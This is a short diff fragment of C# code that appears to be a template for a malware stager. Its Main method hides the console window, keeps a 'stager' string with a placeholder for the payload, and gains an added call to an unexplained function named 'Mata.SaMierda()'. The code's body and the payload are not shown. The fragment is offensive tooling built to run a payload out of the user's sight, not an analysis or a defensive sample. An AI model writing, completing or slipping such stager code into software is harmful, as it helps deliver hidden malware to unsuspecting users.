@@ -50,6 +50,7 @@ namespace cmd
         const int SW_HIDE = 0;
         public static void Main(string[] args)
         {
+            Mata.SaMierda();
             var handle = GetConsoleWindow();
             ShowWindow(handle, SW_HIDE);
             string stager = " YOUR CODE GOES HERE";
